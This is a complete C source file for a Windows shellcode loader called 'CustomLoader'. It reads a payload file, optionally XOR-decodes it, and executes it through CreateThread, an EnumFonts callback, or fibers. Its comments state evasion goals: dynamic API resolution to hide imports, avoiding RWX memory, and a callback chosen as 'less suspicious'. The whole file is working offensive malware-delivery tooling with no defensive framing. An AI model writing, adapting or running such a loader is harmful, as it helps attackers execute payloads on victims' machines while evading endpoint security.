#include <windows.h>
#include <stdio.h>

// Dynamic API resolution — avoid static imports in IAT
typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef HANDLE (WINAPI *pCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD  (WINAPI *pWaitForSingleObject)(HANDLE, DWORD);
typedef BOOL   (WINAPI *pVirtualFree)(LPVOID, SIZE_T, DWORD);
typedef BOOL   (WINAPI *pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);

// XOR decode shellcode in-place
static void xor_decode(unsigned char *buf, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        buf[i] ^= key;
    }
}

// Read binary file into allocated buffer
static unsigned char *read_shellcode(const char *path, size_t *out_len) {
    HANDLE hFile = CreateFileA(path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return NULL;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
        CloseHandle(hFile);
        return NULL;
    }

    unsigned char *buf = (unsigned char *)HeapAlloc(GetProcessHeap(), 0, fileSize);
    if (!buf) {
        CloseHandle(hFile);
        return NULL;
    }

    DWORD bytesRead = 0;
    if (!ReadFile(hFile, buf, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        HeapFree(GetProcessHeap(), 0, buf);
        CloseHandle(hFile);
        return NULL;
    }

    CloseHandle(hFile);
    *out_len = (size_t)fileSize;
    return buf;
}

// Method 1: VirtualAlloc + CreateThread (classic)
static int exec_createthread(unsigned char *sc, size_t len) {
    HMODULE k32 = GetModuleHandleA("kernel32.dll");
    pVirtualAlloc _VirtualAlloc = (pVirtualAlloc)GetProcAddress(k32, "VirtualAlloc");
    pCreateThread _CreateThread = (pCreateThread)GetProcAddress(k32, "CreateThread");
    pWaitForSingleObject _WaitForSingleObject = (pWaitForSingleObject)GetProcAddress(k32, "WaitForSingleObject");
    pVirtualFree _VirtualFree = (pVirtualFree)GetProcAddress(k32, "VirtualFree");

    if (!_VirtualAlloc || !_CreateThread || !_WaitForSingleObject) return -1;

    // Allocate as RW first
    LPVOID mem = _VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) return -1;

    memcpy(mem, sc, len);

    // Flip to RX — avoid RWX
    DWORD oldProtect;
    pVirtualProtect _VirtualProtect = (pVirtualProtect)GetProcAddress(k32, "VirtualProtect");
    if (!_VirtualProtect || !_VirtualProtect(mem, len, PAGE_EXECUTE_READ, &oldProtect)) {
        _VirtualFree(mem, 0, MEM_RELEASE);
        return -1;
    }

    HANDLE hThread = _CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    if (!hThread) {
        _VirtualFree(mem, 0, MEM_RELEASE);
        return -1;
    }

    _WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    _VirtualFree(mem, 0, MEM_RELEASE);
    return 0;
}

// Method 2: Callback execution via EnumFonts
typedef int (CALLBACK *FONTENUMPROCA)(const LOGFONTA *, const TEXTMETRICA *, DWORD, LPARAM);

static int exec_callback(unsigned char *sc, size_t len) {
    HMODULE k32 = GetModuleHandleA("kernel32.dll");
    pVirtualAlloc _VirtualAlloc = (pVirtualAlloc)GetProcAddress(k32, "VirtualAlloc");
    pVirtualProtect _VirtualProtect = (pVirtualProtect)GetProcAddress(k32, "VirtualProtect");
    pVirtualFree _VirtualFree = (pVirtualFree)GetProcAddress(k32, "VirtualFree");

    if (!_VirtualAlloc || !_VirtualProtect) return -1;

    LPVOID mem = _VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) return -1;

    memcpy(mem, sc, len);

    DWORD oldProtect;
    if (!_VirtualProtect(mem, len, PAGE_EXECUTE_READ, &oldProtect)) {
        _VirtualFree(mem, 0, MEM_RELEASE);
        return -1;
    }

    // Use EnumFonts as a callback trigger — less suspicious than CreateThread
    HDC hdc = GetDC(NULL);
    EnumFontsA(hdc, NULL, (FONTENUMPROCA)mem, 0);
    ReleaseDC(NULL, hdc);

    _VirtualFree(mem, 0, MEM_RELEASE);
    return 0;
}

// Method 3: Fiber execution
typedef LPVOID (WINAPI *pConvertThreadToFiber)(LPVOID);
typedef LPVOID (WINAPI *pCreateFiber)(SIZE_T, LPFIBER_START_ROUTINE, LPVOID);
typedef VOID   (WINAPI *pSwitchToFiber)(LPVOID);
typedef VOID   (WINAPI *pDeleteFiber)(LPVOID);

static int exec_fiber(unsigned char *sc, size_t len) {
    HMODULE k32 = GetModuleHandleA("kernel32.dll");
    pVirtualAlloc _VirtualAlloc = (pVirtualAlloc)GetProcAddress(k32, "VirtualAlloc");
    pVirtualProtect _VirtualProtect = (pVirtualProtect)GetProcAddress(k32, "VirtualProtect");
    pVirtualFree _VirtualFree = (pVirtualFree)GetProcAddress(k32, "VirtualFree");
    pConvertThreadToFiber _ConvertThreadToFiber = (pConvertThreadToFiber)GetProcAddress(k32, "ConvertThreadToFiber");
    pCreateFiber _CreateFiber = (pCreateFiber)GetProcAddress(k32, "CreateFiber");
    pSwitchToFiber _SwitchToFiber = (pSwitchToFiber)GetProcAddress(k32, "SwitchToFiber");
    pDeleteFiber _DeleteFiber = (pDeleteFiber)GetProcAddress(k32, "DeleteFiber");

    if (!_VirtualAlloc || !_VirtualProtect || !_ConvertThreadToFiber ||
        !_CreateFiber || !_SwitchToFiber || !_DeleteFiber) return -1;

    LPVOID mem = _VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) return -1;

    memcpy(mem, sc, len);

    DWORD oldProtect;
    if (!_VirtualProtect(mem, len, PAGE_EXECUTE_READ, &oldProtect)) {
        _VirtualFree(mem, 0, MEM_RELEASE);
        return -1;
    }

    LPVOID mainFiber = _ConvertThreadToFiber(NULL);
    if (!mainFiber) {
        _VirtualFree(mem, 0, MEM_RELEASE);
        return -1;
    }

    LPVOID scFiber = _CreateFiber(0, (LPFIBER_START_ROUTINE)mem, NULL);
    if (!scFiber) {
        _VirtualFree(mem, 0, MEM_RELEASE);
        return -1;
    }

    _SwitchToFiber(scFiber);
    _DeleteFiber(scFiber);
    _VirtualFree(mem, 0, MEM_RELEASE);
    return 0;
}

static void print_usage(const char *name) {
    printf("CustomLoader — C Shellcode Loader\n\n");
    printf("Usage: %s <shellcode.bin> [options]\n\n", name);
    printf("Options:\n");
    printf("  -m <method>    Execution method (default: 1)\n");
    printf("                   1 = CreateThread\n");
    printf("                   2 = Callback (EnumFonts)\n");
    printf("                   3 = Fiber\n");
    printf("  -x <key>       XOR decode key (0-255, for encoded payloads)\n");
    printf("  -h             Show this help\n");
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        print_usage(argv[0]);
        return 1;
    }

    const char *bin_path = NULL;
    int method = 1;
    int xor_key = -1;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-m") == 0 && i + 1 < argc) {
            method = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-x") == 0 && i + 1 < argc) {
            xor_key = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-h") == 0) {
            print_usage(argv[0]);
            return 0;
        } else {
            bin_path = argv[i];
        }
    }

    if (!bin_path) {
        printf("[-] No shellcode file specified.\n");
        return 1;
    }

    // Read shellcode
    size_t sc_len = 0;
    unsigned char *sc = read_shellcode(bin_path, &sc_len);
    if (!sc) {
        printf("[-] Failed to read: %s\n", bin_path);
        return 1;
    }
    printf("[+] Loaded %zu bytes\n", sc_len);

    // XOR decode if key provided
    if (xor_key >= 0 && xor_key <= 255) {
        xor_decode(sc, sc_len, (unsigned char)xor_key);
        printf("[+] XOR decoded (key: 0x%02X)\n", xor_key);
    }

    // Execute
    int result = -1;
    switch (method) {
        case 1:
            printf("[+] Method: CreateThread\n");
            result = exec_createthread(sc, sc_len);
            break;
        case 2:
            printf("[+] Method: Callback (EnumFonts)\n");
            result = exec_callback(sc, sc_len);
            break;
        case 3:
            printf("[+] Method: Fiber\n");
            result = exec_fiber(sc, sc_len);
            break;
        default:
            printf("[-] Invalid method: %d\n", method);
            break;
    }

    // Cleanup — zero out shellcode from heap
    SecureZeroMemory(sc, sc_len);
    HeapFree(GetProcessHeap(), 0, sc);

    if (result == 0) {
        printf("[+] Done.\n");
    } else {
        printf("[-] Execution failed.\n");
    }

    return result;
}
